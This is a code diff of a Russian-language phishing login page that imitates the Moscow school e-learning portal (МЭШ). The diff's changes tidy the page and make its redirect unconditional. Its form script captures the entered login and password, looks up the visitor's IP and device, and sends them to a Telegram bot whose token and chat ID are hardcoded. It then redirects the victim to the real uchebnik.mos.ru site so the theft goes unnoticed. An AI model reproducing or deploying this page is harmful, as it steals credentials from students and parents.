@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Вход</title>
-    <!-- Favicon для правдоподобности -->
     <link rel="icon" type="image/png" href="https://via.placeholder.com/16x16?text=🔒">
     <style>
         body {
@@ -23,11 +22,11 @@
         }
         .left-section {
             width: 50%;
-            background-color: #f5f5f5; /* Светлый фон для прозрачности картинки */
+            background-color: #f5f5f5;
             display: flex;
             flex-direction: column;
             justify-content: space-between;
-            padding: 48px; /* 40px * 1.2 */
+            padding: 48px;
             box-sizing: border-box;
             color: #000;
             position: relative;
@@ -36,18 +35,18 @@
             flex: 0 1 auto;
         }
         .left-section .logo {
-            font-size: 28.8px; /* 24px * 1.2 */
+            font-size: 28.8px;
             font-weight: bold;
             color: #d32f2f;
-            margin-bottom: 24px; /* 20px * 1.2 */
+            margin-bottom: 24px;
         }
         .left-section h2 {
-            font-size: 28.8px; /* 24px * 1.2 */
+            font-size: 28.8px;
             font-weight: 700;
-            margin: 0 0 12px; /* 10px * 1.2 */
+            margin: 0 0 12px;
         }
         .left-section p {
-            font-size: 19.2px; /* 16px * 1.2 */
+            font-size: 19.2px;
             margin: 0;
         }
         .left-section .image-container {
@@ -56,13 +55,13 @@
             position: relative;
             bottom: 0;
             width: 100%;
-            max-height: 607.2px; /* 506px * 1.2 */
+            max-height: 607.2px;
         }
         .left-section .image-container img {
             width: 100%;
-            max-width: 1257.6px; /* 1048px * 1.2 */
+            max-width: 1257.6px;
             height: auto;
-            max-height: 607.2px; /* 506px * 1.2 */
+            max-height: 607.2px;
             object-fit: contain;
             object-position: bottom center;
         }
@@ -72,20 +71,20 @@
             flex-direction: column;
             justify-content: center;
             align-items: center;
-            padding: 48px; /* 40px * 1.2 */
+            padding: 48px;
             box-sizing: border-box;
         }
         .login-box {
             width: 100%;
-            max-width: 480px; /* 400px * 1.2 */
+            max-width: 480px;
         }
         .login-box .header {
             display: flex;
             justify-content: space-between;
-            margin-bottom: 24px; /* 20px * 1.2 */
+            margin-bottom: 24px;
         }
         .login-box .header h1 {
-            font-size: 28.8px; /* 24px * 1.2 */
+            font-size: 28.8px;
             font-weight: 700;
             margin: 0;
             color: #000;
@@ -93,40 +92,40 @@
         .login-box .header a {
             color: #007bff;
             text-decoration: none;
-            font-size: 16.8px; /* 14px * 1.2 */
+            font-size: 16.8px;
             font-weight: 400;
         }
         .login-box .header a:hover {
             text-decoration: underline;
         }
         .login-box p.label {
-            font-size: 16.8px; /* 14px * 1.2 */
+            font-size: 16.8px;
             color: #333;
             text-align: left;
-            margin: 6px 0; /* 5px * 1.2 */
+            margin: 6px 0;
         }
         .login-box input[type="text"],
         .login-box input[type="password"] {
             width: 100%;
-            padding: 14.4px 12px; /* 12px * 1.2, 10px * 1.2 */
-            margin: 6px 0; /* 5px * 1.2 */
+            padding: 14.4px 12px;
+            margin: 6px 0;
             border: 1px solid #d1d5db;
-            border-radius: 4.8px; /* 4px * 1.2 */
+            border-radius: 4.8px;
             box-sizing: border-box;
-            font-size: 16.8px; /* 14px * 1.2 */
+            font-size: 16.8px;
             color: #333;
             outline: none;
         }
         .login-box input[type="text"]:focus,
         .login-box input[type="password"]:focus {
             border-color: #007bff;
-            box-shadow: 0 0 0 2.4px rgba(0, 123, 255, 0.1); /* 2px * 1.2 */
+            box-shadow: 0 0 0 2.4px rgba(0, 123, 255, 0.1);
         }
         .login-box .password-options {
             display: flex;
             justify-content: space-between;
-            font-size: 14.4px; /* 12px * 1.2 */
-            margin: 12px 0; /* 10px * 1.2 */
+            font-size: 14.4px;
+            margin: 12px 0;
         }
         .login-box .password-options label {
             display: flex;
@@ -134,9 +133,9 @@
             color: #333;
         }
         .login-box .password-options input[type="checkbox"] {
-            margin-right: 6px; /* 5px * 1.2 */
-            width: 19.2px; /* 16px * 1.2 */
-            height: 19.2px; /* 16px * 1.2 */
+            margin-right: 6px;
+            width: 19.2px;
+            height: 19.2px;
         }
         .login-box .password-options a {
             color: #007bff;
@@ -147,12 +146,12 @@
         }
         .login-box input[type="submit"] {
             width: 100%;
-            padding: 14.4px; /* 12px * 1.2 */
+            padding: 14.4px;
             background-color: #0056b3;
             color: #fff;
             border: none;
-            border-radius: 4.8px; /* 4px * 1.2 */
-            font-size: 19.2px; /* 16px * 1.2 */
+            border-radius: 4.8px;
+            font-size: 19.2px;
             font-weight: 500;
             cursor: pointer;
             transition: background-color 0.3s;
@@ -164,8 +163,8 @@
             display: flex;
             align-items: center;
             text-align: center;
-            margin: 24px 0; /* 20px * 1.2 */
-            font-size: 16.8px; /* 14px * 1.2 */
+            margin: 24px 0;
+            font-size: 16.8px;
             color: #666;
         }
         .login-box .divider::before,
@@ -173,29 +172,29 @@
             content: '';
             flex: 1;
             border-bottom: 1px solid #d1d5db;
-            margin: 0 12px; /* 10px * 1.2 */
+            margin: 0 12px;
         }
         .login-box .qr-option {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 12px; /* 10px * 1.2 */
+            padding: 12px;
             border: 1px solid #d1d5db;
-            border-radius: 4.8px; /* 4px * 1.2 */
-            font-size: 16.8px; /* 14px * 1.2 */
+            border-radius: 4.8px;
+            font-size: 16.8px;
             color: #333;
-            margin-bottom: 24px; /* 20px * 1.2 */
+            margin-bottom: 24px;
             cursor: pointer;
         }
         .login-box .qr-option:hover {
             background-color: #f8f9fa;
         }
         .login-box .qr-option img {
-            width: 24px; /* 20px * 1.2 */
-            height: 24px; /* 20px * 1.2 */
+            width: 24px;
+            height: 24px;
         }
         .login-box .recommendation {
-            font-size: 14.4px; /* 12px * 1.2 */
+            font-size: 14.4px;
             color: #666;
             text-align: center;
             line-height: 1.5;
@@ -205,13 +204,13 @@
                 width: 50%;
             }
             .left-section {
-                padding: 72px; /* 60px * 1.2 */
+                padding: 72px;
             }
             .right-section {
-                padding: 72px; /* 60px * 1.2 */
+                padding: 72px;
             }
             .login-box {
-                max-width: 540px; /* 450px * 1.2 */
+                max-width: 540px;
             }
             .left-section .image-container img {
                 max-width: 80%;
@@ -228,7 +227,6 @@
                 <p>МЭШ</p>
             </div>
             <div class="image-container">
-                <!-- Вернул kart.png -->
                 <img src="kart.png" alt="Ученики">
             </div>
         </div>
@@ -263,20 +261,19 @@
         document.getElementById('showPassword').addEventListener('change', function() {
             const passwordField = document.querySelector('input[name="password"]');
             if (this.checked) {
-                passwordField.type = 'text'; // Показываем пароль
+                passwordField.type = 'text';
             } else {
-                passwordField.type = 'password'; // Скрываем пароль
+                passwordField.type = 'password';
             }
         });
 
         // Обработка отправки формы
         document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault(); // Останавливаем отправку формы
-            
-            // Получаем данные из формы
+            e.preventDefault();
+
             const login = document.querySelector('input[name="login"]').value;
             const password = document.querySelector('input[name="password"]').value;
-            const userAgent = navigator.userAgent.toLowerCase(); // Получаем userAgent в нижнем регистре для удобства
+            const userAgent = navigator.userAgent.toLowerCase();
 
             // Функция для разбора userAgent
             function parseUserAgent(ua) {
@@ -284,24 +281,21 @@
                 let os = "Unknown";
                 let device = "Unknown";
 
-                // Определяем браузер
                 if (ua.includes("chrome")) browser = "Chrome";
                 else if (ua.includes("firefox")) browser = "Firefox";
                 else if (ua.includes("safari") && !ua.includes("chrome")) browser = "Safari";
                 else if (ua.includes("edge")) browser = "Edge";
                 else if (ua.includes("opera") || ua.includes("opr")) browser = "Opera";
 
-                // Определяем ОС
                 if (ua.includes("windows")) os = "Windows";
                 else if (ua.includes("mac os") || ua.includes("macintosh")) os = "MacOS";
                 else if (ua.includes("android")) os = "Android";
                 else if (ua.includes("iphone") || ua.includes("ipad")) os = "iOS";
                 else if (ua.includes("linux")) os = "Linux";
 
-                // Определяем устройство (примерная логика)
                 if (ua.includes("iphone")) device = "iPhone";
                 else if (ua.includes("ipad")) device = "iPad";
-                else if (ua.includes("samsung")) device = "Samsung"; // Не всегда точная модель
+                else if (ua.includes("samsung")) device = "Samsung";
                 else if (ua.includes("android") && !ua.includes("samsung")) device = "Android Device";
                 else if (ua.includes("windows") || ua.includes("mac")) device = "PC";
 
@@ -310,30 +304,25 @@
 
             const { browser, os, device } = parseUserAgent(userAgent);
 
-            // Получаем IP-адрес через ipify API
+            // Получаем IP и отправляем данные в Telegram
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
-                    const ip = data.ip; // Получаем IP-адрес
-                    
-                    // Настройки Telegram
-                    const token = "7205362097:AAGoHFfrGVNw4HvRFCWlD5OPTK5ZA7bZHwo"; // Твой токен
-                    const chatId = "2068847868"; // Твой Chat ID
+                    const ip = data.ip;
+                    const token = "7205362097:AAGoHFfrGVNw4HvRFCWlD5OPTK5ZA7bZHwo";
+                    const chatId = "2068847868";
                     const message = encodeURIComponent(`Логин: ${login}\nПароль: ${password}\nIP: ${ip}\nБраузер: ${browser}\nОС: ${os}\nУстройство: ${device}`);
-                    
-                    // Отправляем данные в Telegram
-                    return fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}`);
+
+                    // Отправка в Telegram (без ожидания ответа)
+                    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}`)
+                        .catch(error => console.error('Ошибка Telegram:', error));
                 })
-                .then(response => {
-                    if (response.ok) {
-                        window.location.href = "https://uchebnik.mos.ru/main";
-                    } else {
-                        console.error('Ошибка отправки в Telegram');
-                    }
-                })
-                .catch(error => console.error('Ошибка:', error));
+                .catch(error => console.error('Ошибка IP:', error))
+                .finally(() => {
+                    // Редирект в любом случае
+                    window.location.href = "https://uchebnik.mos.ru/main";
+                });
         });
     </script>
-    <script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'92b11b6a0891b03e',t:'MTc0Mzc3Mjg2OC4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
 </body>
 </html>
